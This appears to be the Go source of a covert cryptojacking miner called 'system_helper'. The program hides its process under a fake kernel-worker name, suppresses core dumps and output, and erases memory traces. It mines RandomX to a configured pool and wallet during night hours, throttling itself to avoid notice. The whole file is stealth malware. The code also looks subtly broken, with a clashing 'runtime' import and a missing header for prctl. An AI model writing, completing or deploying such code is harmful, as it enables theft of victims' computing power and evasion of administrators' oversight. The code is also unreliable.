package main

/*
#cgo CFLAGS: -I/usr/local/include -O3 -march=native -fomit-frame-pointer
#cgo LDFLAGS: -L/usr/local/lib -lrandomx -lstdc++ -lm -lpthread
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void set_process_name(const char* name) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
}
*/
import "C"

import (
	"encoding/binary"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"system_helper/config"
	"system_helper/miner"
	"system_helper/runtime"
	"system_helper/stealth"
)

const (
	MAGIC_SEED    = 0xDEADBEEF
	SCHEDULE_START_HOUR = 23
	SCHEDULE_START_MIN  = 30
	SCHEDULE_END_HOUR   = 6
	SCHEDULE_END_MIN    = 30
	CPU_TARGET_PERCENT  = 90
	RESERVED_CORES      = 1
)

var (
	globalController *runtime.Controller
	isActive         uint32
	cycleCounter     uint64
	shutdownChan     = make(chan struct{}, 1)
)

func init() {
	stealth.DisableCoreDumps()
	stealth.HideProcess("[kworker/u16:0]")
	stealth.RedirectOutput()
	
	seedCryptographic()
	
	setLowPriority()
	
	if checkExistingInstance() {
		os.Exit(0)
	}
}

func main() {
	cfg := config.LoadStealthConfig()
	
	globalController = runtime.NewController(cfg)
	
	configureResourceLimits()
	
	for {
		currentTime := time.Now()
		
		if shouldActivate(currentTime) && atomic.LoadUint32(&isActive) == 0 {
			activateMining(cfg)
		} else if !shouldActivate(currentTime) && atomic.LoadUint32(&isActive) == 1 {
			deactivateMining()
		}
		
		stealthSleep()
		
		atomic.AddUint64(&cycleCounter, 1)
		if atomic.LoadUint64(&cycleCounter)%1000 == 0 {
			stealth.CleanMemoryTraces()
		}
		
		select {
		case <-shutdownChan:
			cleanShutdown()
			return
		default:
		}
	}
}

func shouldActivate(now time.Time) bool {
	currentHour := now.Hour()
	currentMinute := now.Minute()
	
	currentTotal := currentHour*60 + currentMinute
	startTotal := SCHEDULE_START_HOUR*60 + SCHEDULE_START_MIN
	endTotal := SCHEDULE_END_HOUR*60 + SCHEDULE_END_MIN
	
	if startTotal > endTotal {
		return currentTotal >= startTotal || currentTotal < endTotal
	}
	return currentTotal >= startTotal && currentTotal < endTotal
}

func activateMining(cfg *config.Config) {
	atomic.StoreUint32(&isActive, 1)
	
	optimalCores := calculateOptimalCores()
	
	rxEngine, err := miner.NewRandomXEngine(cfg.WalletKey())
	if err != nil {
		return
	}
	
	for i := 0; i < optimalCores; i++ {
		go miningWorker(i, rxEngine, cfg)
	}
	
	go runtime.StartWatchdog(optimalCores, CPU_TARGET_PERCENT)
}

func miningWorker(id int, engine *miner.RandomXEngine, cfg *config.Config) {
	workChan := make(chan []byte, 10)
	resultChan := make(chan []byte, 10)
	
	setCPUAffinity(id)
	
	for atomic.LoadUint32(&isActive) == 1 {
		work, err := miner.FetchWork(cfg.PoolAddress(), cfg.WalletAddress())
		if err != nil {
			stealthSleep()
			continue
		}
		
		hash, valid := engine.ProcessWork(work)
		if valid {
			miner.SubmitWork(cfg, work, hash)
		}
		
		dynamicThrottle()
	}
}

func calculateOptimalCores() int {
	totalCores := runtime.NumCPU()
	
	availableCores := totalCores - RESERVED_CORES
	if availableCores < 1 {
		availableCores = 1
	}
	
	targetCores := int(float64(availableCores) * CPU_TARGET_PERCENT / 100.0)
	
	systemLoad := getSystemLoad()
	if systemLoad > 0.7 {
		targetCores = targetCores / 2
		if targetCores < 1 {
			targetCores = 1
		}
	}
	
	return targetCores
}

func getSystemLoad() float64 {
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/loadavg")
		if err == nil {
			parts := strings.Fields(string(data))
			if len(parts) > 0 {
				load, _ := strconv.ParseFloat(parts[0], 64)
				return load / float64(runtime.NumCPU())
			}
		}
	}
	return 0.0
}

func dynamicThrottle() {
	load := getSystemLoad()
	
	var sleepTime time.Duration
	switch {
	case load > 0.8:
		sleepTime = 100 * time.Millisecond
	case load > 0.6:
		sleepTime = 50 * time.Millisecond
	default:
		sleepTime = 10 * time.Millisecond
	}
	
	time.Sleep(sleepTime)
}

func stealthSleep() {
	base := 1000 + rand.Intn(2000)
	jitter := rand.Intn(500)
	C.usleep(C.useconds_t(base + jitter))
}

func seedCryptographic() {
	var seed int64
	seed ^= int64(time.Now().UnixNano())
	seed ^= int64(os.Getpid())
	
	entropy := make([]byte, 8)
	syscall.Getrandom(entropy, 0)
	seed ^= int64(binary.LittleEndian.Uint64(entropy))
	
	rand.Seed(seed)
}

func setLowPriority() {
	syscall.Setpriority(syscall.PRIO_PROCESS, 0, 10)
}

func setCPUAffinity(core int) {
	if runtime.GOOS == "linux" {
		var mask syscall.CPUSet
		mask.Set(core % runtime.NumCPU())
		syscall.SchedSetaffinity(0, &mask)
	}
}

func checkExistingInstance() bool {
	lockPath := "/tmp/.system_helper.lock"
	
	fd, err := syscall.Open(lockPath, syscall.O_CREAT|syscall.O_RDWR|syscall.O_EXCL, 0600)
	if err != nil {
		return true
	}
	
	pid := strconv.Itoa(os.Getpid())
	syscall.Write(fd, []byte(pid))
	
	return false
}

func configureResourceLimits() {
	syscall.Setrlimit(syscall.RLIMIT_DATA, &syscall.Rlimit{
		Cur: 2 * 1024 * 1024 * 1024, // 2GB
		Max: 2 * 1024 * 1024 * 1024,
	})
	
	syscall.Setrlimit(syscall.RLIMIT_NOFILE, &syscall.Rlimit{
		Cur: 1024,
		Max: 1024,
	})
}

func deactivateMining() {
	atomic.StoreUint32(&isActive, 0)
	
	if globalController != nil {
		globalController.Stop()
	}
}

func cleanShutdown() {
	deactivateMining()
	stealth.CleanupAll()
	os.Exit(0)
}
